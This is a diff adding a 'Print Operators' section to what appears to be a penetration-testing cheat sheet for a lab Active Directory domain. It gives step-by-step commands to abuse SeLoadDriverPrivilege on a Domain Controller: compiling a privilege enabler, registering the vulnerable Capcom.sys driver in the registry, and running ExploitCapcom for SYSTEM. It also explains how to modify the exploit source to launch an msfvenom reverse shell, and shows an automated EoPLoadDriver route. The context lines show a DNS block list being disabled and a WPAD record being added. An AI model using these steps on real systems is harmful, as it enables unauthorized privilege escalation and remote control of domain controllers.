@@ -294,3 +294,91 @@ Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreigh
 # Adding a WPAD Record
 Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
 ```
+
+## Print Operators
+- Print Operators is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller
+- we can load a driver that can exec commands in DC like [Capcom.sys dirver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) 
+
+### check
+```powershell
+whoami /priv
+
+Privilege Name                Description                          State
+============================= ==================================  ==========
+SeLoadDriverPrivilege         Load and unload device drivers       Disabled
+```
+
+
+### RCE: Manual way GUI 
+1) Compile this tool [EnableSeLoadDriverPrivilege](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp), add this lines in the top of the tool
+
+```c
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+then compile and send it to the victim
+```powershell
+cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+```
+run it to enable the `LoadDriverPrivilege` 
+```powershell
+EnableSeLoadDriverPrivilege.exe
+```
+
+2) add [Capcom.sys dirver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) to the registery 
+```powershell
+# The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path.
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+3) Verify Capcom Driver is Listed using [driverview](http://www.nirsoft.net/utils/driverview.html)
+```powershell
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+```
+4) Use [ExploitCapcom Tool](https://github.com/tandasat/ExploitCapcom) to Escalate Privileges
+```powershell
+.\ExploitCapcom.exe
+```
+5) clean
+```powershell
+reg delete HKCU\System\CurrentControlSet\Capcom
+```
+
+### RCE: Manual way no GUI
+- same steps in the prev
+- If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling.
+- Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe` with, say, a reverse shell binary created with msfvenom, for example: `c:\ProgramData\revshell.exe`.
+```c
+// Launches a command shell process
+static bool LaunchShell()
+{   
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe"); // replace this line
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+
+```
+
+### RCE: Automated
+- We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver.
+```powershel
+.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+
+.\ExploitCapcom.exe
+```
